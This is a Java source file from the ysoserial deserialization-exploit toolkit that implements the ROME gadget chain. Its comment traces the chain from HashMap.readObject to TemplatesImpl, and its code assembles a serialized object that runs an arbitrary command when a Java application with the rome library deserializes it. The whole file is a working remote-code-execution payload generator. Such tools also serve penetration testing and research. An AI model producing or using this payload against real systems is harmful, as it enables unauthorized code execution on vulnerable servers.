package ysoserial.payloads;


import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/**
 * 
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])  
 * NativeMethodAccessorImpl.invoke(Object, Object[])  
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])  
 * Method.invoke(Object, Object...)  
 * ToStringBean.toString(String) 
 * ToStringBean.toString()   
 * ObjectBean.toString() 
 * EqualsBean.beanHashCode() 
 * ObjectBean.hashCode() 
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * 
 * @author mbechler
 *
 */
@Dependencies("rome:rome:1.0")
public class ROME implements ObjectPayload<Object> {
	
	@Bind private String command;

    /**
	 * @deprecated Use {@link #getObject()} instead
	 */
	public Object getObject ( String command ) throws Exception {
		return getObject();
	}


	public Object getObject ( ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }
    
    
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }

}
